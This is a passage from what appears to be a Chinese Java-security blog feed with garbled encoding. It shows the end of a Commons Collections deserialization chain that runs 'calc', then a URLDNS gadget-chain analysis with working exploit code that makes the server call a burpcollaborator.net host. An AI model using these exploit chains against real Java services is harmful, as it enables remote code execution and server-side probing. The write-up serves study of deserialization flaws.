punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>Object<span class="token operator">></span> transformedMap<span class="token operator">=</span>TransformedMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>null<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">cc</span><span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor annotationInvocationHandlerConstructor <span class="token operator">=</span>cc<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Map<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Object o<span class="token operator">=</span>annotationInvocationHandlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>Target<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>transformedMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h5><ol><li><a href="https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0">https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0</a>                            ç™½æ—¥æ¢¦ç»„é•¿</li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Javaå®‰å…¨ </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNSåˆ©ç”¨é“¾åˆ†æ</title>
      <link href="/2021/11/30/urldns-lian-fen-xi/"/>
      <url>/2021/11/30/urldns-lian-fen-xi/</url>
      
        <content type="html"><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p>ç¬¬ä¸€ä¸ªgadget chainåˆ†æï¼Œå› ä¸ºzhegeæ¯”è¾ƒç®€å•ã€‚</p><h5 id="è§¦å‘ååºåˆ—åŒ–çš„æ¡ä»¶"><a href="#è§¦å‘ååºåˆ—åŒ–çš„æ¡ä»¶" class="headerlink" title="è§¦å‘ååºåˆ—åŒ–çš„æ¡ä»¶"></a>è§¦å‘ååºåˆ—åŒ–çš„æ¡ä»¶</h5><ol><li>ç±»è¦ç»§æ‰¿Serializableï¼šjavaçš„åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–ä¸€å®šè¦ç»§æ‰¿Serializableã€‚</li><li>æ‰¾åˆ°å…¥å£ç±»ï¼ˆé‡å†™readObjectï¼Œè°ƒç”¨å¸¸è§çš„å‡½æ•°ï¼Œå‚æ•°ç±»å‹å®½æ³›ï¼Œæœ€å¥½jdkè‡ªå¸¦ï¼‰</li><li>è°ƒç”¨é“¾ ç›¸åŒåç§°ï¼Œç›¸åŒç±»å‹</li><li>æ‰§è¡Œç±»ä¸­çš„æ–¹æ³•(RCE,SSRFç­‰æ¼æ´)</li><li>ååºåˆ—åŒ–å…¥å£</li></ol><h5 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>ï¼ˆæˆ‘è®¤ä¸ºï¼‰æŒ–gadgetéœ€è¦å…ˆæ‰¾åˆ°æ‰§è¡Œç±»ï¼ŒçŒœæµ‹URLDNSçš„ä½œè€…å¯èƒ½æ˜¯æƒ³æŒ–ä¸€ä¸ªSSRFï¼Œå› æ­¤æƒ³åˆ°URLè¿™ä¸ªåŸç”Ÿç±»ã€‚å› ä¸ºè¦æŒ–é“¾å­ï¼Œæ‰€ä»¥è¦å°½é‡æ‰¾åŒåçš„æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°URLæœ‰hashCodeæ–¹æ³•ã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hashCode <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>        hashCode <span class="token operator">=</span> handler<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·Ÿè¿›handler.hashCode()ï¼Œå¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†getHostAddressæ–¹æ³•ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/urldns1.png" style="zoom: 67%;" /><p>è€ŒgetHostAddressæ–¹æ³•æ‰§è¡Œäº†getByNameæ–¹æ³•ï¼ŒgetByNameæ–¹æ³•ç”¨äºè§£æåŸŸåï¼Œè¯¥DNSè§£æè¿‡ç¨‹è‡ªç„¶æ˜¯æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚ï¼Œä¹Ÿå°±è¾¾åˆ°äº†SSRFçš„ç›®çš„ã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">protected</span> <span class="token keyword">synchronized</span> InetAddress <span class="token function">getHostAddress</span><span class="token punctuation">(</span>URL u<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>u<span class="token punctuation">.</span>hostAddress <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token keyword">return</span> u<span class="token punctuation">.</span>hostAddress<span class="token punctuation">;</span>        String host <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>host <span class="token operator">==</span> null <span class="token operator">||</span> host<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                u<span class="token punctuation">.</span>hostAddress <span class="token operator">=</span> InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å…³é”®</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnknownHostException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> null<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> se<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> null<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> u<span class="token punctuation">.</span>hostAddress<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç°åœ¨æ‰¾åˆ°äº†é“¾å­çš„ååŠæ®µï¼š</p><p>URL.hashCode() -&gt;URLStreamHandler.hashCode()-&gt;URLStreamHandler.getHostAddress()-&gt;InetAddress.getByName()</p><p>æ¥ä¸‹æ¥æ‰¾è¿æ¥URL.hashCode()çš„å‰åŠæ®µï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æœ€å¥½æ˜¯åŸç”Ÿç±»ï¼Œå¹¶ä¸”readObjectæ–¹æ³•ä¸­ä¸€å±‚æ¥ä¸€å±‚æœ€ç»ˆè§¦å‘äº†hashCodeæ–¹æ³•ã€‚è§‚å¯ŸHashMapç±»çš„readObjectæœ€åå‡ è¡Œè°ƒç”¨äº†hashæ–¹æ³•ï¼Œè€Œå¦‚æœkeyä¸ä¸ºnullåˆ™è°ƒç”¨keyçš„hashCodeæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœkeyæ˜¯URLç±»çš„å¯¹è±¡ï¼Œåˆ™å°±ä¼šè°ƒç”¨URL.hashCode()ã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//...ç•¥</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mappings<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>                    K key <span class="token operator">=</span> <span class="token punctuation">(</span>K<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>                    V value <span class="token operator">=</span> <span class="token punctuation">(</span>V<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> h<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token punctuation">(</span>h <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› æ­¤æ•´æ¡é“¾å­ï¼š</p><pre class="line-numbers language-java"><code class="language-java">HashMap<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>HashMap<span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>URL<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>URL<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span>URLStreamHandler<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>URLStreamHandler<span class="token punctuation">.</span><span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="é”™è¯¯çš„exp"><a href="#é”™è¯¯çš„exp" class="headerlink" title="é”™è¯¯çš„exp"></a>é”™è¯¯çš„exp</h5><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>MalformedURLException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UrlDns</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://?????.ceye.io"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        serialize(hashmap);</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap <span class="token operator">=</span> <span class="token punctuation">(</span>HashMap<span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬åœ°æµ‹è¯•æ‰§è¡Œååºåˆ—åŒ–ä¼šå‘ç°å¹¶æ²¡æœ‰è§¦å‘DNSè§£æã€‚</p><p>è¿™æ˜¯å› ä¸ºHashmapçš„putæ–¹æ³•ä¹Ÿä¼šæ‰§è¡ŒURLçš„hashCode()</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> V <span class="token function">put</span><span class="token punctuation">(</span>K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„åˆ°å¦‚æœhashCodeä¸ç­‰äºåˆå§‹åŒ–çš„-1æ—¶åˆ™ç›´æ¥return hashCodeï¼Œå¦‚æœç”¨è¿™ä¸ªåºåˆ—åŒ–çš„å­—èŠ‚æµååºåˆ—åŒ–è‚¯å®šä¸ä¼šè¿›è¡ŒDNSè§£æã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹hashCodeçš„å€¼ä¸º-1ã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hashCode <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>        hashCode <span class="token operator">=</span> handler<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="æœ€ç»ˆexp"><a href="#æœ€ç»ˆexp" class="headerlink" title="æœ€ç»ˆexp"></a>æœ€ç»ˆexp</h5><p>é€šè¿‡åå°„ä¿®æ”¹å±æ€§å³å¯ï¼Œæ³¨æ„hashCodeä¸ºç§æœ‰å±æ€§ã€‚éœ€è¦é€šè¿‡setAccessibleè®¾ç½®ä½œç”¨åŸŸã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>MalformedURLException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UrlDns</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchFieldException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        URL url<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://nqhaouynesbyaf4nivnxzrpwangh46.burpcollaborator.net"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field hashcode<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashcode<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashcode<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        serialize(hashmap);</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap <span class="token operator">=</span> <span class="token punctuation">(</span>HashMap<span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h5><p>1.<a href="https://blog.csdn.net/qq_47886905/article/details/123531299">https://blog.csdn.net/qq_47886905/article/details/123531299</a></p><p>2.<a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=fc78460cf16000301f7b3b1c07529ee0">https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=fc78460cf16000301f7b3b1c07529ee0</a></p><p>3.<a href="https://www.cnblogs.com/starrys/p/15564335.html">https://www.cnblogs.com/starrys/p/15564335.html</a></p><p>4.<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Javaå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trickæ€»ç»“â€”â€”XXE</title>
      <link href="/2021/11/25/trick-xxe/"/>
      <url>/2021/11/25/trick-xxe/</url>
      
